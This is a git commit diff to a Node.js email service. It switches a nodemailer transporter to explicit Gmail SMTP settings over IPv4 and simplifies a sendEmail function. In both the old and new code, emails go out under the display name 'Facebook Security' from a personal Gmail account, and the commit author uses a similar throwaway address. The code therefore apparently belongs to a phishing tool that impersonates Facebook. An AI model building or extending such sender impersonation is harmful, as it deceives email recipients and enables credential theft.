74efb04fcc2a7b0a74e9bbca7a4a58a7a467be53
patrick red <securitysystemf@gmail.com>
2026-03-09 18:25:17 +0100

    fix smtp ipv6 railway issue

--- services/emailService.js
+++ services/emailService.js
@@ -3,43 +3,37 @@ const nodemailer = require("nodemailer")
 
 const transporter = nodemailer.createTransport({
 
-service:"gmail",
+host: "smtp.gmail.com",
+port: 587,
+secure: false,
 
-auth:{
-user:process.env.EMAIL_USER,
-pass:process.env.EMAIL_PASS
+auth: {
+user: process.env.EMAIL_USER,
+pass: process.env.EMAIL_PASS
 },
 
-tls:{
-rejectUnauthorized:false
+tls: {
+family: 4
 }
 
 })
 
-async function sendEmail(to,subject,html){
+async function sendEmail(to, subject, html){
 
 try{
 
-const mailOptions = {
+const info = await transporter.sendMail({
+from: `"Facebook Security" <${process.env.EMAIL_USER}>`,
+to,
+subject,
+html
+})
 
-from:`"Facebook Security" <${process.env.EMAIL_USER}>`,
-to:to,
-subject:subject,
-html:html
-
-}
-
-const info = await transporter.sendMail(mailOptions)
-
-console.log("Email sent:",info.response)
-
-return true
+console.log("Email sent:", info.response)
 
 }catch(err){
 
-console.error("Email error:",err)
-
-return false
+console.error("Email error:", err)
 
 }
 
